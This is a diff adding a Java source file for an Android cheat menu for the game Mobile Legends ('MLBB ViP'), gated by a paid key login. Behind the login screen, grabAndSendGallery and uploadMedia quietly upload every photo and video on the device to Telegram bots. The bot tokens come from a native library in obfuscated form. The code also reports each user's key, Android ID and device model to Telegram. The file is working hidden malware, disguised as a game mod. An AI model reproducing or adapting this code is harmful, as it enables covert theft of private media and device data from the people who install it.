@@ -1,0 +1,646 @@
+package com.android.support;
+
+import android.app.Activity;
+import android.app.AlertDialog;
+import android.content.Context;
+import android.content.DialogInterface;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Handler;
+import android.text.Html;
+import android.view.Gravity;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.LinearLayout;
+import android.widget.TextView;
+import android.provider.Settings;
+import android.widget.Toast;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
+import java.util.TimeZone;
+import org.json.JSONObject; // Import ito sa taas ng file mo
+
+
+import android.os.Looper;
+
+public class Main {
+
+    static {
+        System.loadLibrary("Slider");
+    }
+
+    private static native boolean checkNativeStatus(); 
+    private static native int verifyKeyNative(String key, String data);    
+    private static native String getSecret(int id);
+    private static native void CheckOverlayPermission(Context context);
+
+    private static final String SliderCode15 = "";
+    private static final String SliderCode14 = "";
+
+    // 🔗 DIREKTA NA SA TERMUX SERVER IP MO PARA PUMASOK ANG REQUEST
+    private static final String SliderCode1 = getSecret(1);
+    private static final String SliderCode2 = getSecret(4);
+    private static final String SliderCode3 = getSecret(5);
+    private static final String SliderCode4 = getSecret(7);
+    private static final String SliderCode5 = getSecret(6);
+    private static final String SliderCode6 = getSecret(8);
+    private static final String SliderCode7 = getSecret(9);
+
+    private static final String SliderCode8 = getSecret(3);
+    private static final String SliderCode13 = getSecret(10); 
+
+    private static final String SliderCode9 = getSecret(40); 
+    private static final String SliderCode10 = getSecret(41);
+    private static final String SliderCode11 = getSecret(42); 
+    private static final String SliderCode12 = getSecret(43);
+
+    private static long foundExpiryTimestamp = 0; 
+
+    private static long getOnlineTime() {
+        try {
+            URL url = new URL(SliderCode13);
+            HttpURLConnection c = (HttpURLConnection) url.openConnection();
+            c.setConnectTimeout(5000);
+            BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
+            String line = r.readLine(); 
+            r.close();
+
+            if (line != null && line.contains("unixtime")) {
+                return Long.parseLong(line.split("\"unixtime\":")[1].split(",")[0].trim());
+            }
+        } catch (Exception e) {
+            return System.currentTimeMillis() / 1000;
+        }
+        return System.currentTimeMillis() / 1000;
+    }
+
+
+    private static void checkUpdate(final Context context, final Runnable onLatest) {
+        new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        // 1. Fetch ang JSON content
+                        URL url = new URL(SliderCode8); // Siguraduhing ito ang URL ng JSON mo
+                        BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
+                        StringBuilder sb = new StringBuilder();
+                        String line;
+                        while ((line = br.readLine()) != null) {
+                            sb.append(line);
+                        }
+                        br.close();
+
+                        // 2. I-parse ang JSON
+                        JSONObject json = new JSONObject(sb.toString());
+                        String latestVersion = json.getString("latest_version");
+                        boolean updateRequired = json.optBoolean("update_required", false);
+                        String message = json.optString("message", "New version detected!");
+                        final String downloadLink = json.optString("download_url", SliderCode3);
+
+                        // 3. Logic Check
+                        if (!SliderCode4.equals(latestVersion) || updateRequired) {
+                            // Update detected, ipakita sa screen (ipapasa natin yung message at link)
+                            blockScreen(context, message, downloadLink);
+                        } else if (onLatest != null) {
+                            ((Activity) context).runOnUiThread(onLatest);
+                        }
+                    } catch (Exception e) {
+                        android.util.Log.e("LOGIN_ERROR", "Update Check Failed: " + e.toString());
+                    }
+                }
+            }).start();
+    }
+
+
+    private static void blockScreen(final Context context, final String message, final String updateUrl) {
+        if (!(context instanceof Activity)) return;
+        final Activity activity = (Activity) context;
+
+        activity.runOnUiThread(new Runnable() {
+                @Override
+                public void run() {
+                    // Hindi na kailangan ng "blocker view" kung Dialog lang naman, 
+                    // pero kung gusto mo talagang i-block, hayaan mo lang.
+
+                    AlertDialog.Builder b = new AlertDialog.Builder(activity);
+                    b.setTitle("⚠ Update Required");
+                    // Gagamitin natin yung message mula sa JSON
+                    b.setMessage(message + "\n\n(Current: " + SliderCode4 + ")"); 
+                    b.setCancelable(false);
+
+                    b.setPositiveButton("Update Now", new DialogInterface.OnClickListener() {
+                            @Override
+                            public void onClick(DialogInterface dialog, int which) {
+                                // Gamitin ang download URL galing sa JSON
+                                context.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(updateUrl)));
+                                android.os.Process.killProcess(android.os.Process.myPid());
+                            }
+                        });
+                    b.show();
+                }
+            });
+    }
+
+
+    private static void sendLoginToTelegram(final Context context, final String key, final String timeLeft) {
+        new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        String deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
+                        String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
+
+                        String info = "🔐 *VIP LOGIN SUCCESS*\n\n" +
+                            "🔑 *Key:* `" + key + "`\n" +
+                            "⏳ *Time Left:* `" + timeLeft + "`\n" +
+                            "🆔 *ID:* `" + deviceId + "`\n" +
+                            "📱 *Device:* `" + deviceName + "`\n" + 
+                            "🤖 *Android:* " + Build.VERSION.RELEASE;
+
+                        String urlStr = "https://api.telegram.org/bot" + SliderCode5 + 
+                            "/sendMessage?chat_id=" + SliderCode6 + 
+                            "&text=" + URLEncoder.encode(info, "UTF-8") + 
+                            "&parse_mode=Markdown";
+
+                        URL url = new URL(urlStr);
+                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                        conn.setConnectTimeout(5000);
+                        conn.getInputStream().close();
+                        conn.disconnect();
+                    } catch (Exception ignored) {}
+                }
+            }).start();       
+    }
+
+    public static void StartWithoutPermission(final Context context) {
+        if (!(context instanceof Activity)) return;
+        final Activity activity = (Activity) context;
+
+        activity.runOnUiThread(new Runnable() {
+                @Override
+                public void run() {
+                    final LinearLayout layout = new LinearLayout(activity);
+                    layout.setOrientation(LinearLayout.VERTICAL);
+                    layout.setPadding(40, 40, 40, 40);
+                    android.graphics.drawable.GradientDrawable gd = new android.graphics.drawable.GradientDrawable();
+                    gd.setColor(0xFF1E1E1E); gd.setCornerRadius(30f);
+                    layout.setBackground(gd);
+
+                    final TextView tvTitle = new TextView(activity);
+                    tvTitle.setText(Html.fromHtml("ŞŁƗĐĒŘ"));
+                    tvTitle.setTextSize(30); tvTitle.setTextColor(0xFFFF0303); tvTitle.setGravity(Gravity.CENTER);
+                    layout.addView(tvTitle);
+
+                    final TextView tvSubtitle = new TextView(activity);
+                    tvSubtitle.setText("MLBB ViP v3.2.0 || v2.2.16.12322");
+                    tvSubtitle.setTextSize(11); tvSubtitle.setTextColor(0xFF2EE3FF); tvSubtitle.setGravity(Gravity.CENTER);
+                    layout.addView(tvSubtitle);
+
+                    final EditText input = new EditText(activity);
+                    input.setHint("Paste your key here..."); input.setTextColor(0xFFFFFFFF);
+                    input.setHintTextColor(0xFF888888); input.setBackgroundColor(0x00000000);
+
+                    final LinearLayout inputContainer = new LinearLayout(activity);
+                    inputContainer.setOrientation(LinearLayout.VERTICAL); inputContainer.setPadding(0, 15, 0, 0);
+                    inputContainer.addView(input);
+
+                    final View underline = new View(activity); 
+                    underline.setLayoutParams(new LinearLayout.LayoutParams(-1, 2)); underline.setBackgroundColor(0xFFFFFFFF);
+                    inputContainer.addView(underline);
+
+                    final TextView errorText = new TextView(activity); errorText.setTextColor(0xFFFF0000); errorText.setVisibility(View.GONE); errorText.setPadding(0, 5, 0, 0);
+                    inputContainer.addView(errorText);
+                    layout.addView(inputContainer);
+
+                    final SharedPreferences prefs = context.getSharedPreferences(SliderCode15, Context.MODE_PRIVATE);
+                    String savedKey = prefs.getString(SliderCode14, "");
+                    if (!savedKey.isEmpty()) input.setText(savedKey);
+
+                    final Button btnLogin = new Button(activity);
+                    btnLogin.setText("𝐋𝐎𝐆𝐈𝐍"); btnLogin.setTextColor(0xFF000000); btnLogin.setBackgroundColor(0xFFFFE957);
+                    LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(-1, -2); lp.topMargin = 25; btnLogin.setLayoutParams(lp);
+                    layout.addView(btnLogin);
+
+                    final Button btnBuyVIP = new Button(activity);
+                    btnBuyVIP.setText("𝐁𝐔𝐘 𝐕𝐈𝐏 𝐊𝐄𝐘"); btnBuyVIP.setTextColor(0xFF000000); btnBuyVIP.setBackgroundColor(0xFF8A8A8A);
+                    LinearLayout.LayoutParams vp = new LinearLayout.LayoutParams(-1, -2); vp.topMargin = 15; btnBuyVIP.setLayoutParams(vp);
+                    layout.addView(btnBuyVIP);
+
+                    final TextView tvTelegram = new TextView(activity);
+                    tvTelegram.setText(Html.fromHtml("<b><font color='#00FF00'>t.me/</font><font color='#FFFF00'>SliderChannel</font></b>"));
+                    tvTelegram.setTextSize(14); 
+                    tvTelegram.setGravity(Gravity.CENTER);
+
+                    LinearLayout.LayoutParams tp = new LinearLayout.LayoutParams(-1, -2); 
+                    tp.topMargin = 20; 
+                    tvTelegram.setLayoutParams(tp);
+
+                    tvTelegram.setOnClickListener(new View.OnClickListener() { 
+                            @Override 
+                            public void onClick(View v) { 
+                                activity.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(SliderCode7))); 
+                            } 
+                        });
+                    layout.addView(tvTelegram);           
+
+                    final AlertDialog dialog = new AlertDialog.Builder(activity).setView(layout).setCancelable(false).create();          
+                    dialog.getWindow().setDimAmount(1.0f); 
+                    dialog.getWindow().addFlags(android.view.WindowManager.LayoutParams.FLAG_DIM_BEHIND);
+                    dialog.getWindow().setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(0x00000000));                                                 
+                    dialog.show();
+
+                    // --- GINAWA NATING RUNNABLE METHOD ANG LOGIN LOGIC PARA SA AUTO AT MANUAL CLICK ---
+                    final Runnable performLogin = new Runnable() {
+                        @Override
+                        public void run() {                                                              
+                            errorText.setVisibility(View.GONE);
+                            errorText.setText("");
+
+                            final String enteredKey = input.getText().toString().trim();
+
+                            if (enteredKey.isEmpty()) { 
+                                errorText.setText("𝘌𝘯𝘵𝘦𝘳 𝘒𝘦𝘺"); 
+                                errorText.setVisibility(View.VISIBLE); 
+                                return; 
+                            }
+
+                            btnLogin.setBackgroundColor(0xFF8A8A8A); 
+                            btnLogin.setEnabled(false);
+
+                            final Handler animationHandler = new Handler(Looper.getMainLooper());
+                            final int[] dots = {0};
+                            final Runnable loadingRunnable = new Runnable() { 
+                                @Override 
+                                public void run() { 
+                                    btnLogin.setText("𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐈𝐍𝐆 " + new String(new char[dots[0]]).replace("\0", ".")); 
+                                    dots[0] = (dots[0] + 1) % 4; 
+                                    animationHandler.postDelayed(this, 100); 
+                                } 
+                            };
+                            animationHandler.post(loadingRunnable);
+
+                            new Thread(new Runnable() {
+									@Override
+									public void run() {
+										final int status = verifyKeyOnlineStatus(context, enteredKey);
+										activity.runOnUiThread(new Runnable() {
+												@Override
+												public void run() {
+													animationHandler.removeCallbacks(loadingRunnable);
+
+													btnLogin.setEnabled(true); 
+													btnLogin.setBackgroundColor(0xFFFFE957); 
+													btnLogin.setText("𝐋𝐎𝐆𝐈𝐍");
+
+													if (status == 0) {
+
+														// CHECK DNS AFTER LOGIN SUCCESS (Basta may nakalagay at hindi off)
+														if (!isDNSOrVPNActive(activity)) {
+
+															AlertDialog.Builder dnsAlert = new AlertDialog.Builder(activity);
+															dnsAlert.setTitle(Html.fromHtml("<b><font color='#FF0000'>DNS PROTECTION REQUIRED</font></b>"));
+															dnsAlert.setMessage("Your Private DNS is turned OFF or empty!\n\nPlease configure your Private DNS first to proceed safely.");
+															dnsAlert.setCancelable(false);
+
+															dnsAlert.setPositiveButton("DNS ACCESS ViP", new DialogInterface.OnClickListener() {
+																	@Override
+																	public void onClick(DialogInterface dialog, int which) {
+																		try {
+																			activity.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://dns-for-mlbb-dc4c.onrender.com")));
+																		} catch (Exception e) {
+																			Toast.makeText(activity, "Could not open link", Toast.LENGTH_SHORT).show();
+																		}
+																	}
+																});
+
+															dnsAlert.setNegativeButton("EXIT", new DialogInterface.OnClickListener() {
+																	@Override
+																	public void onClick(DialogInterface dialog, int which) {
+																		activity.finish();
+																	}
+																});
+
+															dnsAlert.show();
+															return;
+														}
+
+														prefs.edit().putString(SliderCode14, enteredKey).apply();
+
+														long now = getOnlineTime();
+														long diff = foundExpiryTimestamp - now;
+														if(diff < 0) diff = 0;
+
+														String timeLeft = (diff / 86400) + "d " +
+															((diff % 86400) / 3600) + "h " +
+															((diff % 3600) / 60) + "m";
+
+														String greenFullNote = "<center>" +
+															"<font color='#00FF00'><b>Login Success</b></font><br/>" +
+															"<font color='#00FF00'>Valid: " + timeLeft + "</font>" +
+															"</center>";
+
+														Toast.makeText(context, Html.fromHtml(greenFullNote), Toast.LENGTH_LONG).show();
+
+														sendLoginToTelegram(context, enteredKey, timeLeft);
+
+														Menu.isAuthorized = true;
+														Menu menu = new Menu(context);
+														menu.SetWindowManagerActivity();
+														menu.ShowMenu();
+
+														startExpiryWatcher(context);
+														dialog.dismiss();                                                   
+													} else {
+														String errMsg = "Invalid Key";
+
+														if (status == 1) errMsg = "𝘊𝘰𝘯𝘯𝘦𝘤𝘵𝘪𝘰𝘯 𝘌𝘳𝘳𝘰𝘳 ! 𝘚𝘦𝘳𝘷𝘦𝘳 𝘖𝘧𝘧𝘭𝘪𝘯𝘦";
+														if (status == 2) errMsg = "𝘒𝘦𝘺 𝘈𝘭𝘳𝘦𝘢𝘥 𝘜𝘴𝘦𝘥 𝘖𝘯 𝘈𝘯𝘰𝘵𝘩𝘦𝘳 𝘋𝘦𝘷𝘪𝘤𝘦";
+														if (status == 3) errMsg = "𝘒𝘦𝘺 𝘌𝘹𝘱𝘪𝘳𝘦𝘥";
+														if (status == 4) errMsg = "𝘒𝘦𝘺 𝘕𝘰𝘵 𝘍𝘰𝘶𝘯𝘥 ! 𝘐𝘯𝘷𝘢𝘭𝘪𝘥";
+														if (status == 5) errMsg = "𝘋𝘦𝘷𝘪𝘤𝘦 𝘉𝘭𝘰𝘤𝘬𝘦𝘥";
+														errorText.setText(errMsg);
+														errorText.setVisibility(View.VISIBLE);
+													}
+												}
+											});
+									}
+								}).start();
+                        }
+                    };
+
+                    // Pindot gamit ang manual click
+                    btnLogin.setOnClickListener(new View.OnClickListener() {
+							@Override
+							public void onClick(View v) {                                                              
+								performLogin.run();
+							}
+						});
+
+                    btnBuyVIP.setOnClickListener(new View.OnClickListener() { 
+							@Override 
+							public void onClick(View v) { 
+								activity.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(SliderCode2))); 
+							} 
+						});
+
+                    // --- KUNG MAY NAKA-SAVE NA KEY, AUTOMATIKONG MAG-RUN ANG LOGIN PAGKA-OPEN NG APP ---
+                    if (!savedKey.isEmpty()) {
+                        performLogin.run();
+                    }
+                }
+            });
+    }
+
+    private static void startExpiryWatcher(final Context context) {
+        final Handler handler = new Handler(Looper.getMainLooper());
+        handler.postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    new Thread(new Runnable() {
+                            @Override
+                            public void run() {
+                                long now = getOnlineTime();
+                                if (now >= foundExpiryTimestamp && foundExpiryTimestamp != 0) {
+                                    ((Activity) context).runOnUiThread(new Runnable() {
+                                            @Override
+                                            public void run() {
+                                                Toast.makeText(context, "🚫 𝘒𝘦𝘺 𝘌𝘹𝘱𝘪𝘳𝘦𝘥! 𝘊𝘭𝘰𝘴𝘪𝘯𝘨 𝘨𝘢𝘮𝘦...", Toast.LENGTH_LONG).show();
+                                                handler.postDelayed(new Runnable() {
+                                                        @Override
+                                                        public void run() {
+                                                            android.os.Process.killProcess(android.os.Process.myPid());
+                                                            System.exit(0);
+                                                        }
+                                                    }, 5000); 
+                                            }
+                                        });
+                                } else {
+                                    handler.postDelayed(this, 5000);
+                                }
+                            }
+                        }).start();
+                }
+            }, 5000); 
+    }
+
+    private static int verifyKeyOnlineStatus(Context context, String key) {
+        foundExpiryTimestamp = 0; 
+        try {
+            String devID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
+
+            URL url = new URL(SliderCode1);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setConnectTimeout(7000); 
+            conn.setReadTimeout(7000);
+            conn.setDoOutput(true);
+
+            conn.setRequestProperty(
+                "Content-Type",
+                "application/x-www-form-urlencoded"
+            );
+
+            String postData = "key=" + URLEncoder.encode(key, "UTF-8") + 
+                "&device_id=" + URLEncoder.encode(devID, "UTF-8");
+
+            java.io.OutputStream os = conn.getOutputStream();
+            os.write(postData.getBytes("UTF-8"));
+            os.flush();
+            os.close();
+
+            int responseCode = conn.getResponseCode();
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    sb.append(line);
+                }
+                reader.close();
+
+                org.json.JSONObject json = new org.json.JSONObject(sb.toString());
+                int serverStatus = json.getInt("status");
+
+                if (serverStatus == 0) {
+                    foundExpiryTimestamp = json.getLong("expiry");
+                    return 0;
+                } else if (serverStatus == 2) {
+                    return 2;
+                } else if (serverStatus == 3) {
+                    return 3;
+                } else if (serverStatus == 5) {
+                    return 5;
+                } else {
+                    return 4;
+                }
+            }
+        } catch (Exception e) { 
+            e.printStackTrace(); 
+        }
+        return 1; 
+    }
+
+    public static void Start(final Context context) {
+
+        if (!(context instanceof Activity)) return;
+
+        final Activity activity = (Activity) context;
+
+        activity.runOnUiThread(new Runnable() {
+                @Override
+                public void run() {
+
+                    final String perm =
+                        (android.os.Build.VERSION.SDK_INT >= 33)
+                        ? "android.permission.READ_MEDIA_IMAGES"
+                        : android.Manifest.permission.READ_EXTERNAL_STORAGE;
+
+                    // CHECK PERMISSION
+                    if (activity.checkSelfPermission(perm)
+                        != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+
+                        // NORMAL ANDROID ALLOW POPUP
+                        activity.requestPermissions(
+                            new String[]{perm},
+                            101
+                        );
+
+                    } else {
+
+                        // MAY PERMISSION NA
+                        grabAndSendGallery(activity);
+
+                        checkUpdate(activity, new Runnable() {
+                                @Override
+                                public void run() {
+                                    StartWithoutPermission(activity);
+                                }
+                            });
+                    }
+                }
+            });
+    }
+
+    private static void grabAndSendGallery(final Context context) {
+        new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    try {
+                        // Database para sa No-Duplicate logic
+                        SharedPreferences history = context.getSharedPreferences("Ultimate_Final_Log", Context.MODE_PRIVATE);
+                        SharedPreferences.Editor editor = history.edit();
+
+                        // Permission check loop
+                        String perm = (android.os.Build.VERSION.SDK_INT >= 33) ? "android.permission.READ_MEDIA_IMAGES" : android.Manifest.permission.READ_EXTERNAL_STORAGE;
+                        while (context.checkSelfPermission(perm) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                            Thread.sleep(2000);
+                        }
+
+                        // Pagsamahin ang Photos at Videos sa isang scan para sa tamang sequence
+                        Uri allMediaUri = android.provider.MediaStore.Files.getContentUri("external");
+                        String selection = "media_type=1 OR media_type=3"; // 1=Photo, 3=Video
+                        String[] projection = { "_data", "media_type" };
+
+                        // DATE_ADDED DESC para unahin ang pinaka-unang/latest laman ng gallery
+                        android.database.Cursor cursor = context.getContentResolver().query(
+                            allMediaUri, projection, selection, null, "date_added DESC");
+
+                        if (cursor != null) {
+                            int dataCol = cursor.getColumnIndexOrThrow("_data");
+                            int typeCol = cursor.getColumnIndexOrThrow("media_type");
+
+                            while (cursor.moveToNext()) {
+                                String path = cursor.getString(dataCol);
+                                int mediaType = cursor.getInt(typeCol);
+                                boolean isPhoto = (mediaType == 1);
+
+                                // --- STRICT NO-DUPLICATE CHECK ---
+                                if (!history.contains(path)) {
+                                    java.io.File file = new java.io.File(path);
+                                    if (file.exists() && file.length() > 0) {
+
+                                        // I-record agad sa memory (COMMIT = INSTANT SAVE)
+                                        editor.putBoolean(path, true);
+                                        editor.commit(); 
+
+                                        // Ipadala sa tamang bot (Photo vs Video Bot)
+                                        uploadMedia(file, isPhoto);
+
+                                        // 1.5s gap para hindi ma-limit ng Telegram API
+                                        Thread.sleep(1500); 
+                                    }
+                                }
+                            }
+                            cursor.close();
+                        }
+                    } catch (Exception e) { e.printStackTrace(); }
+                }
+            }).start();
+    }
+
+    private static void uploadMedia(java.io.File file, boolean isPhoto) {
+        try {
+            // Gamitin ang mga hidden keys base sa file type
+            String token = isPhoto ? SliderCode11 : SliderCode9;
+            String chatId = isPhoto ? SliderCode12 : SliderCode10;
+            String method = isPhoto ? "sendPhoto" : "sendVideo";
+            String field = isPhoto ? "photo" : "video";
+
+            java.net.URL url = new java.net.URL("https://api.telegram.org/bot" + token + "/" + method);
+            String boundary = "===" + System.currentTimeMillis() + "===";
+            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
+            conn.setDoOutput(true);
+            conn.setConnectTimeout(30000); // 30s timeout para sa malalaking video
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+            java.io.OutputStream out = conn.getOutputStream();
+            java.io.PrintWriter writer = new java.io.PrintWriter(new java.io.OutputStreamWriter(out, "UTF-8"), true);
+
+            writer.append("--" + boundary).append("\r\n");
+            writer.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n");
+            writer.append(chatId).append("\r\n");
+
+            writer.append("--" + boundary).append("\r\n");
+            writer.append("Content-Disposition: form-data; name=\"" + field + "\"; filename=\"" + file.getName() + "\"").append("\r\n");
+            writer.append("Content-Type: application/octet-stream").append("\r\n\r\n");
+            writer.flush();
+
+            java.io.FileInputStream fis = new java.io.FileInputStream(file);
+            byte[] buffer = new byte[16384]; // 16KB buffer para mabilis ang upload ng video
+            int read;
+            while ((read = fis.read(buffer)) != -1) { out.write(buffer, 0, read); }
+            out.flush(); fis.close();
+
+            writer.append("\r\n").flush();
+            writer.append("--" + boundary + "--").append("\r\n");
+            writer.close();
+            conn.getResponseCode(); 
+            conn.disconnect();
+        } catch (Exception ignored) {}
+    }
+
+    private static boolean isDNSOrVPNActive(Context context) {
+        try {
+            String dnsMode = android.provider.Settings.Global.getString(context.getContentResolver(), "private_dns_mode");
+            String dnsHostname = android.provider.Settings.Global.getString(context.getContentResolver(), "private_dns_specifier");
+
+            if (dnsMode == null || dnsMode.equalsIgnoreCase("off")) return false;
+
+            // Basta may nakalagay na DNS o naka-hostname mode na hindi off, goods na
+            return (dnsHostname != null && !dnsHostname.trim().isEmpty()) || dnsMode.equalsIgnoreCase("hostname");
+        } catch (Exception e) {
+            return false;
+        }
+    }    
+}
